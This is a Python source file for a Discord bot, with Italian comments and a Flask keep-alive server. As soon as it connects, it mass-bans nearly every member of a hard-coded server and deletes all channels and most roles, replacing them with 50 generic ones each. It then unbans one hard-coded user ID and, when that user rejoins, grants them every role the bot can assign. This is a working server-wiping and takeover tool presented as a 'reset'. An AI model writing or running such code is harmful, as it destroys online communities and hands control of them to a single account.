import os
import threading
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
from flask import Flask

# Carica il token dal file .env
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

# Configura qui direttamente il Guild ID e l'User ID (in formato intero)
GUILD_ID = 1348947150641303583  # Sostituisci con l'ID del tuo server
USER_ID_SPECIFICO = 1191824316376043580  # Sostituisci con l'ID dell'utente

# --- CONFIGURAZIONE FLASK ---
app = Flask(__name__)


@app.route("/")
def home():
  return "Il bot Discord è attivo e online!"


def run_flask():
  app.run(host="0.0.0.0", port=5000)


# --- CONFIGURAZIONE DISCORD BOT ---
intents = discord.Intents.default()
intents.guilds = True
intents.bans = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)


@bot.event
async def on_ready():
  print(f"Bot connesso come {bot.user}")

  try:
    guild = bot.get_guild(GUILD_ID)
    if not guild:
      guild = await bot.fetch_guild(GUILD_ID)

    app_info = await bot.application_info()
    bot_owner = app_info.owner

    print("--- INIZIO PROCEDURA DI RESET AUTOMATICO ALL'AVVIO ---")

    # 1. BAN DI MASSA DEI MEMBRI
    await guild.chunk()
    banned_count = 0
    for member in guild.members:
      if member == guild.me or member == guild.owner or member == bot_owner:
        continue
      try:
        await member.ban(
            reason=(
                "Reset totale automatico del server eseguito all'avvio del"
                " bot."
            )
        )
        banned_count += 1
      except Exception as e:
        print(f"Impossibile bannare {member.name}: {e}")
    print(f"[Reset] Membri bannati: {banned_count}")

    # 2. ELIMINAZIONE E CREAZIONE CANALI (Nome base modificabile, es. "canale")
    base_channel_name = "canale"
    for channel in list(guild.channels):
      try:
        await channel.delete()
      except Exception as e:
        print(f"Impossibile eliminare il canale {channel.name}: {e}")

    for i in range(1, 51):
      try:
        await guild.create_text_channel(f"{base_channel_name}-{i}")
      except Exception as e:
        print(f"Impossibile creare il canale {base_channel_name}-{i}: {e}")
    print("[Reset] Canali resettati e creati 50 nuovi canali.")

    # 3. ELIMINAZIONE E CREAZIONE RUOLI (Nome base modificabile, es. "ruolo")
    base_role_name = "ruolo"
    for role in list(guild.roles):
      if role.is_default() or role.managed or role >= guild.me.top_role:
        continue
      try:
        await role.delete()
      except Exception as e:
        print(f"Impossibile eliminare il ruolo {role.name}: {e}")

    for i in range(1, 51):
      try:
        await guild.create_role(name=f"{base_role_name}-{i}")
      except Exception as e:
        print(f"Impossibile creare il ruolo {base_role_name}-{i}: {e}")
    print("[Reset] Ruoli resettati e creati 50 nuovi ruoli.")

    # 4. SBAN DELL'UTENTE SPECIFICO
    try:
      user = await bot.fetch_user(USER_ID_SPECIFICO)
      await guild.unban(user)
      print(f"Utente {user.name} ({user.id}) sbannato con successo!")
    except discord.NotFound:
      print("L'utente da sbannare non è stato trovato o non risulta bannato.")
    except Exception as e:
      print(f"Errore durante lo sban dell'utente: {e}")

    print("--- PROCEDURA DI RESET COMPLETATA ---")

  except Exception as e:
    print(f"Errore critico durante l'avvio/reset: {e}")


@bot.event
async def on_member_join(member):
  if member.guild.id != GUILD_ID or member.id != USER_ID_SPECIFICO:
    return

  try:
    bot_top_role = member.guild.me.top_role

    assignable_roles = [
        role
        for role in member.guild.roles
        if role < bot_top_role and not role.is_default()
    ]

    if assignable_roles:
      await member.add_roles(
          *assignable_roles,
          reason=(
              "Assegnazione automatica di tutti i ruoli possibili all'utente"
              " specificato"
          ),
      )
      role_names = ", ".join([role.name for role in assignable_roles])
      print(
          f"Assegnati tutti i ruoli ({role_names}) all'utente target"
          f" {member.name} all'ingresso."
      )
    else:
      print("Nessun ruolo assegnabile trovato per questo utente.")

  except discord.Forbidden:
    print(
        "Il bot non ha i permessi necessari (Manage Roles) o sta tentando di"
        " toccare ruoli superiori al suo."
    )
  except Exception as e:
    print(f"Errore imprevisto durante l'assegnazione dei ruoli: {e}")


# --- AVVIO CONCRETO ---
if __name__ == "__main__":
  flask_thread = threading.Thread(target=run_flask)
  flask_thread.daemon = True
  flask_thread.start()
  print("Server Flask avviato sulla porta 5000.")

  bot.run(TOKEN)
